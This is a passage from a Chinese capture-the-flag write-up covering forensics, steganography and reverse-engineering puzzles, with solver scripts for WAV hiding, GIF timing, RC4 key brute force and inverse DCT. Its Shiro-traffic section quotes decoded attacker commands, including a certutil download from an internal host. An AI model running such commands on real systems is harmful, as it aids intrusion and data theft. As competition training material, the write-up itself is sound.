pattern2.search(passwddata)<br>        <span class="hljs-keyword">if</span> passwd:<br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-keyword">if</span> sfz_check(<span class="hljs-keyword">match</span>[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>]) != <span class="hljs-keyword">match</span>[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>][-<span class="hljs-number">1</span>]:<br>                    <span class="hljs-keyword">raise</span> Exception()<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>[<span class="hljs-number">0</span>][<span class="hljs-number">3</span>][<span class="hljs-number">0</span>:<span class="hljs-number">3</span>]) <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> phum:<br>                    <span class="hljs-keyword">raise</span> Exception()<br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">match</span>[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>].isalnum():<br>                    <span class="hljs-keyword">raise</span> Exception()<br>                d = &#123;<span class="hljs-string">&#x27;username&#x27;</span>: check(<span class="hljs-keyword">match</span>[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>], <span class="hljs-number">1</span>), <span class="hljs-string">&#x27;password&#x27;</span>: check(passwd.groups()[<span class="hljs-number">0</span>], <span class="hljs-number">2</span>),<br>                     <span class="hljs-string">&#x27;name&#x27;</span>: check(<span class="hljs-keyword">match</span>[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>], <span class="hljs-number">3</span>), <span class="hljs-string">&#x27;idcard&#x27;</span>: check(<span class="hljs-keyword">match</span>[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>], <span class="hljs-number">4</span>),<br>                     <span class="hljs-string">&#x27;phone&#x27;</span>: check(<span class="hljs-keyword">match</span>[<span class="hljs-number">0</span>][<span class="hljs-number">3</span>], <span class="hljs-number">5</span>)&#125;<br>                ds.append(d)<br>            <span class="hljs-keyword">except</span>:<br>                <span class="hljs-keyword">pass</span><br>        i += <span class="hljs-number">10</span><br>    i += <span class="hljs-number">1</span><br><br><span class="hljs-comment"># print(ds)</span><br><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;example.csv&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(<span class="hljs-string">&#x27;username,password,name,idcard,phone\n&#x27;</span>)<br>    <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> ds:<br>        f.write(<span class="hljs-string">&#x27;,&#x27;</span>.join(d.values()) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="/img/wp/2024/2024-ycb-c-data-analy3.png"></p><h1 id="初赛-misc"><a href="#初赛-misc" class="headerlink" title="[初赛] misc"></a>[初赛] misc</h1><h2 id="hiden"><a href="#hiden" class="headerlink" title="hiden"></a>hiden</h2><p>文件名提示 <code>60=()+().txt</code><br>先rot47在rot13</p><p>得到加密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> wave<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    txt_data = f.read()<br>    file_len = <span class="hljs-built_in">len</span>(txt_data)<br>    txt_data = file_len.to_bytes(<span class="hljs-number">3</span>, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>) + txt_data<br><br><span class="hljs-keyword">with</span> wave.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;test.wav&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    attrib = f.getparams()<br>    wav_data = <span class="hljs-built_in">bytearray</span>(f.readframes(-<span class="hljs-number">1</span>))<br><br><span class="hljs-keyword">for</span> index <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(txt_data)):<br>    wav_data[index * <span class="hljs-number">4</span>] = txt_data[index]<br><br><span class="hljs-keyword">with</span> wave.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;hiden.wav&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    f.setparams(attrib)<br>    f.writeframes(wav_data)<br></code></pre></td></tr></table></figure><p>解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> wave<br><br><span class="hljs-keyword">with</span> wave.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;hiden.wav&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    wav_data = <span class="hljs-built_in">bytearray</span>(f.readframes(-<span class="hljs-number">1</span>))<br><br>txt_data = <span class="hljs-built_in">bytearray</span>()<br><span class="hljs-keyword">for</span> index <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(wav_data), <span class="hljs-number">4</span>):<br>    txt_data.append(wav_data[index])<br><br>file_len = <span class="hljs-built_in">int</span>.from_bytes(txt_data[:<span class="hljs-number">3</span>], byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br>original_data = txt_data[<span class="hljs-number">3</span>:file_len + <span class="hljs-number">3</span>]<br><br><span class="hljs-built_in">print</span>(original_data.decode())<br></code></pre></td></tr></table></figure><h2 id="不一样的数据库-2"><a href="#不一样的数据库-2" class="headerlink" title="不一样的数据库_2"></a>不一样的数据库_2</h2><p>纯数字暴力破解，得到压缩包密码<code>753951</code></p><p>二维码画上定位符扫码得到<code>NRF@WQUKTQ12345&amp;WWWF@WWWFX#WWQXNWXNU</code></p><p><img src="/img/wp/2024/2024-ycb-c-%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93_2-1.png"></p><p>rot13得到<code>AES@JDHXGD12345&amp;JJJS@JJJSK#JJDKAJKAH</code></p><p>压缩包中的另一个文件<code>Kee.kdbx</code>百度可知用keepass打开，密码就是二维码解密的内容</p><p><img src="/img/wp/2024/2024-ycb-c-%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93_2-2.png"></p><p>打开后查看历史修改记录，得到一串加密字符串，和提示aes</p><p><img src="/img/wp/2024/2024-ycb-c-%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93_2-3.png"></p><p>aes的密码就是打开软件后出现的<code>DASCTF</code></p><p><img src="/img/wp/2024/2024-ycb-c-%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93_2-4.png"></p><p><img src="/img/wp/2024/2024-ycb-c-%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93_2-5.png"></p><h2 id="so-much"><a href="#so-much" class="headerlink" title="so much"></a>so much</h2><p>打开题目，给了一个<code>c2hpZnQh.ad1</code>的磁盘文件</p><p>文件尾存在额外数据：<code>the key is: 1234567   really?</code></p><p>将文件名base64解码得到<code>shift!</code></p><p>使用ftk的<code>Decrypt AD1 image</code>对附件解密，密码是1234567加上shift，即<code>!@#$%^&amp;</code></p><p>解密后继续用ftk挂载到磁盘上，发现存在344个<code>.crypto</code>文件</p><p><img src="/img/wp/2024/2024-ycb-c-so-much-1.png"></p><p>同时，文件的时间只有<code>2021/8/5 16:19</code>和<code>2021/8/5 16:20</code></p><p>对秒数进行操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><br><span class="hljs-comment"># 获取344个文件的时间</span><br>time = [<span class="hljs-string">&#x27;&#x27;</span>] * <span class="hljs-number">344</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">344</span>):<br>    time[j] = os.path.getmtime(<span class="hljs-string">&#x27;S:\\&#x27;</span> + <span class="hljs-built_in">str</span>(j) + <span class="hljs-string">&#x27;.crypto&#x27;</span>)<br><br><br><span class="hljs-comment"># 按顺序转换成0和1</span><br>key = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">344</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span>(time[i]) == <span class="hljs-string">&#x27;1628151585.73009&#x27;</span>:<br>        key += <span class="hljs-string">&#x27;0&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        key += <span class="hljs-string">&#x27;1&#x27;</span><br><br><br><span class="hljs-comment"># 344刚好可以整除8，转成字符串</span><br>key = [key[i:i+<span class="hljs-number">8</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(key), <span class="hljs-number">8</span>)]<br>key = <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(i, <span class="hljs-number">2</span>)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> key])<br><span class="hljs-built_in">print</span>(key)<br><br></code></pre></td></tr></table></figure><p>得到<code>the_key_is_700229c053b4ebbcf1a3cc37c389c4fa</code></p><p>使用<code>Encrypto</code>对两个时间不一样的文件解密即可</p><p><img src="/img/wp/2024/2024-ycb-c-so-much-2.png"></p><p>拼接在一起得到flag</p><p><img src="/img/wp/2024/2024-ycb-c-so-much-3.png"></p><h2 id="miaoro"><a href="#miaoro" class="headerlink" title="miaoro"></a>miaoro</h2><p>打开流量包筛选http流量</p><p>根据返回值的特征<code>$$$xxxxxxxx$$$</code>和攻击请求头中的<code>Cookie</code>和<code>GWHT</code>字段可以判断出是shiro反序列化攻击的流量</p><p>将Cookie中的内容进行枚举爆破，得到flag1 <code>DASCTF&#123;B916CFEB-C40F-45D6-A7BC-</code></p><p><img src="/img/wp/2024/2024-ycb-c-miaoro-1.png"></p><p>其中有两条请求base64解码后的命令为</p><p><code>echo Th15_11111111s_pP@sssssw000rd!!!&gt;pass.txt</code><br><code>certutil -urlcache -f &quot;http://192.168.1.3:801/secret.txt&quot;</code></p><p>将secret.txt的数据导出</p><p>发现结尾是<code>036009000414030b405</code>，写脚本逆序并反转字节</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># python2</span><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data.data&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>)<br>d = f.read()<br>e = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> d:<br>    c = <span class="hljs-built_in">ord</span>(i)<br>    e += <span class="hljs-built_in">chr</span>(((c &amp; <span class="hljs-number">0xf</span>) &lt;&lt; <span class="hljs-number">4</span>) + (c &gt;&gt; <span class="hljs-number">4</span>))<br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data.zip&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>)<br>f.write(e[::-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><p>使用上面的密码解压得到flag2.jpg</p><p>画面明显被分割了，尝试修改高宽</p><p><img src="/img/wp/2024/2024-ycb-c-miaoro-2.png"></p><p><img src="/img/wp/2024/2024-ycb-c-miaoro-3.png"></p><p>网上找一个字母表对应后得到<code>EBOFDELQDIAA&#125;</code></p><h2 id="Check-in"><a href="#Check-in" class="headerlink" title="Check in"></a>Check in</h2><p>附件压缩包中的注释base58解码得到<code>Welcome2GZ</code></p><p>根据提示用wbs43open解txt隐写</p><p><img src="/img/wp/2024/2024-ycb-c-Check-in-1.png"></p><p>解出得到一个log文件，是TLS的密钥log，导入到wireshark中</p><p><img src="/img/wp/2024/2024-ycb-c-Check-in-2.png"></p><p>将附件txt内容转成pcapng后打开后发现上传了一个flag.gif</p><p><img src="/img/wp/2024/2024-ycb-c-Check-in-3.png"></p><p>使用identify分析，发现gif每帧的间隔时间在3和23转换</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">identify -format &quot;%T, &quot; 1.gif<br>3, 23, 3, 23, 3, 23, 3, 23, 3, 23, 3, 23, 23, 23, 23, 23, 3, 3, 23, 23, 3, 3, 3, 3, 3, 23, 23, 23, 3, 23, 23, 23, 3, 23, 3, 3, 23, 23, 23, 3, 3, 23, 3, 23, 23, 23, 23, 23, 3, 3, 23, 23, 3, 3, 3, 23, 3, 23, 3, 23, 3, 23, 3, 3<br></code></pre></td></tr></table></figure><p>将23转成1，3转成0后转字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">a = [<span class="hljs-number">3</span>, <span class="hljs-number">23</span>, <span class="hljs-number">3</span>, <span class="hljs-number">23</span>, <span class="hljs-number">3</span>, <span class="hljs-number">23</span>, <span class="hljs-number">3</span>, <span class="hljs-number">23</span>, <span class="hljs-number">3</span>, <span class="hljs-number">23</span>, <span class="hljs-number">3</span>, <span class="hljs-number">23</span>, <span class="hljs-number">23</span>, <span class="hljs-number">23</span>, <span class="hljs-number">23</span>, <span class="hljs-number">23</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">23</span>, <span class="hljs-number">23</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">23</span>, <span class="hljs-number">23</span>, <span class="hljs-number">23</span>, <span class="hljs-number">3</span>, <span class="hljs-number">23</span>, <span class="hljs-number">23</span>, <span class="hljs-number">23</span>, <span class="hljs-number">3</span>, <span class="hljs-number">23</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">23</span>, <span class="hljs-number">23</span>, <span class="hljs-number">23</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">23</span>, <span class="hljs-number">3</span>, <span class="hljs-number">23</span>, <span class="hljs-number">23</span>, <span class="hljs-number">23</span>, <span class="hljs-number">23</span>, <span class="hljs-number">23</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">23</span>, <span class="hljs-number">23</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">23</span>, <span class="hljs-number">3</span>, <span class="hljs-number">23</span>, <span class="hljs-number">3</span>, <span class="hljs-number">23</span>, <span class="hljs-number">3</span>, <span class="hljs-number">23</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>]<br><br>a = [<span class="hljs-number">1</span> <span class="hljs-keyword">if</span> x == <span class="hljs-number">23</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span> <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> a]<br><br>binary_string = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">str</span>, a))<br><br>chars = [<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(binary_string[i:i+<span class="hljs-number">8</span>], <span class="hljs-number">2</span>)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(binary_string), <span class="hljs-number">8</span>)]<br>result = <span class="hljs-string">&#x27;&#x27;</span>.join(chars)<br><span class="hljs-built_in">print</span>(result)<br><br><span class="hljs-comment"># U_0wN_1T</span><br></code></pre></td></tr></table></figure><h2 id="1z-misc"><a href="#1z-misc" class="headerlink" title="1z_misc"></a>1z_misc</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">天地玄黄，宇宙洪荒；日月盈昃，辰宿列张；万物芸芸，息息相关；是以十二岁而行二十八宿，其间奥妙，待探寻，显真章。<br>若女可为11，可为1124......觜可为91，亦可为725......如此往复，周而复始。<br>祈解其秘：[43,101,55,16,16,1017,28,812,824,43,55,226,101,55,55,415,1017,1027,28,28,617,824,28,812,1027,16,101,16,55,1027,1017,28,16]<br></code></pre></td></tr></table></figure><p>结合例子和hint的图片可以得知</p><p>将数字拆成两部分</p><p>第一部分从子开始数，比如1就是子，4就是卯，10就是酉。。。。<br>第二部分的数字表述对应星宿的位置（格子中从右往左逆时针数），比如子的1就是女，卯的3就是心</p><p><img src="/img/wp/2024/2024-ycb-c-1z_misc-1.png"></p><p>将题目给的数组转成对应的文字</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">心,胃,心,奎,奎,心,奎,心,胃,心,心,心,胃,心,心,胃,心,奎,奎,奎,奎,胃,奎,心,奎,奎,胃,奎,心,奎,心,奎,奎<br></code></pre></td></tr></table></figure><p>只有三种文字，将心替换成<code>.</code> 胃替换成<code>/</code> 奎替换成<code>-</code></p><p>解摩斯得到密码<code>E@SI1Y!</code></p><p><img src="/img/wp/2024/2024-ycb-c-1z_misc-2.png"></p><p>解压后看flag文件尾，符合lyra文件特征，同时hint.jpg中的天琴座也表明是lyra</p><p><code>bazel-bin/lyra/cli_example/decoder_main --encoded_path=flag.lyra --output_dir=./ --bitrate=3200</code></p><p>得到一段wav</p><p><img src="/img/wp/2024/2024-ycb-c-1z_misc-3.png"></p><p>在线<a href="https://www.luyinzhushou.com/voice2text/">语音转文本</a>（语速有点快，可以au降速后去识别）后，得到一段社会主义编码，解码得到flag</p><p><img src="/img/wp/2024/2024-ycb-c-1z_misc-4.png"></p><h1 id="初赛-reverse"><a href="#初赛-reverse" class="headerlink" title="[初赛] reverse"></a>[初赛] reverse</h1><h2 id="pic"><a href="#pic" class="headerlink" title="pic"></a>pic</h2><p>爆破五位十六进制得到rc4密钥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">from</span> mcrypt <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">rc4</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">toBytes</span>(<span class="hljs-params">self,data</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(data)==<span class="hljs-built_in">str</span>:<br>            <span class="hljs-keyword">return</span> data.encode()<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span>(data)==<span class="hljs-built_in">bytes</span>:<br>            <span class="hljs-keyword">return</span> data<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;data Type Error&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">GetKey</span>(<span class="hljs-params">self,data</span>):<br>        k=[]<br>        k1=[]<br>        data_l=<span class="hljs-built_in">len</span>(data)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>            k.append(i)<br>            a=<span class="hljs-string">&quot;adsf&quot;</span><br><br>            k1.append(data[i%data_l])<br>        n=<span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>            n=(k1[i]+n+k[i])&amp;<span class="hljs-number">0xff</span><br>            n1=k[i]<br>            k[i]=k[n]<br>            k[n]=n1<br>        <span class="hljs-keyword">return</span> k<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Cipher</span>(<span class="hljs-params">self,data</span>):<br>        data=<span class="hljs-variable language_">self</span>.toBytes(data)<br>        enc=[]<br>        k=<span class="hljs-variable language_">self</span>.Key.copy()<br>        n=<span class="hljs-number">0</span><br>        n1=<span class="hljs-number">0</span><br>        tmp=<span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data)):<br>            n=(n+<span class="hljs-number">1</span>)&amp;<span class="hljs-number">0xff</span><br>            n1=(n1+k[n])&amp;<span class="hljs-number">0xff</span><br>            tmp=k[n]<br>            k[n]=k[n1]<br>            k[n1]=tmp<br>            enc.append(data[i]^<span class="hljs-number">0x11</span>^k[(k[n]+k[n1])%<span class="hljs-number">256</span>])<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(enc)<br><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,key</span>):<br>        key=<span class="hljs-variable language_">self</span>.toBytes(key)<br>        <span class="hljs-variable language_">self</span>.Key=<span class="hljs-variable language_">self</span>.GetKey(key)<br>        <span class="hljs-variable language_">self</span>.__Key=key<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">SetKey</span>(<span class="hljs-params">self,key</span>):<br>        key=<span class="hljs-variable language_">self</span>.toBytes(key)<br>        <span class="hljs-variable language_">self</span>.Key=<span class="hljs-variable language_">self</span>.GetKey(key)<br>        <span class="hljs-variable language_">self</span>.__Key=key<br><br>base_=<span class="hljs-string">b&quot;0123456789abcdef&quot;</span><br>data=[<span class="hljs-number">0x85</span>,<span class="hljs-number">0x43</span>,<span class="hljs-number">0x72</span>,<span class="hljs-number">0x78</span>,<span class="hljs-number">0x26</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> Gendic(base_,<span class="hljs-number">5</span>,<span class="hljs-literal">True</span>):<br>    e=[i[<span class="hljs-number">1</span>]^j <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> data]<br>    <span class="hljs-comment"># print(i)</span><br>    <span class="hljs-comment"># print(e)</span><br>    r=rc4(<span class="hljs-built_in">bytes</span>(i))<br>    d=r.Cipher(<span class="hljs-built_in">bytes</span>(e))<br>    <span class="hljs-keyword">if</span> d==<span class="hljs-string">b&#x27;\x89\x50\x4e\x47\x0d&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p><img src="/img/wp/2024/2024-ycb-c-pic-1.png"></p><h2 id="你这主函数保真么"><a href="#你这主函数保真么" class="headerlink" title="你这主函数保真么"></a>你这主函数保真么</h2><p>离散余弦变换DCT，套模板代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">idct</span>(<span class="hljs-params">dct_data</span>):<br>    N = <span class="hljs-built_in">len</span>(dct_data)<br>    result = np.zeros(N)<br><br>    <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N):<br>        sum_value = <span class="hljs-number">0.0</span><br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N):<br>            cos_term = np.cos((k * <span class="hljs-number">3.14159265</span> * (n + <span class="hljs-number">0.5</span>)) / N)<br>            <span class="hljs-keyword">if</span> k == <span class="hljs-number">0</span>:<br>                sum_value += dct_data[k] * np.sqrt(<span class="hljs-number">1.0</span> / N) * cos_term<br>            <span class="hljs-keyword">else</span>:<br>                sum_value += dct_data[k] * np.sqrt(<span class="hljs-number">2.0</span> / N) * cos_term<br>        result[n] = sum_value<br><br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_to_ascii</span>(<span class="hljs-params">dct_data</span>):<br>    decrypted_data = idct(dct_data)<br>    int_data = np.rint(decrypted_data).astype(<span class="hljs-built_in">int</span>)<br>    char_data = [<span class="hljs-built_in">chr</span>(num) <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> int_data]<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(char_data)<br><br>encrypted_data = [<span class="hljs-number">513.355</span>,<br>  -<span class="hljs-number">37.7986</span>,<br>  <span class="hljs-number">8.7316</span>,<br>  -<span class="hljs-number">10.7832</span>,<br>  -<span class="hljs-number">1.3097</span>,<br>  -<span class="hljs-number">20.5779</span>,<br>  <span class="hljs-number">6.98641</span>,<br>  -<span class="hljs-number">29.2989</span>,<br>  <span class="hljs-number">15.9422</span>,<br>  <span class="hljs-number">21.4138</span>,<br>  <span class="hljs-number">29.4754</span>,<br>  -<span class="hljs-number">2.77161</span>,<br>  -<span class="hljs-number">6.58794</span>,<br>  -<span class="hljs-number">4.22332</span>,<br>  -<span class="hljs-number">7.20771</span>,<br>  <span class="hljs-number">8.83506</span>,<br>  -<span 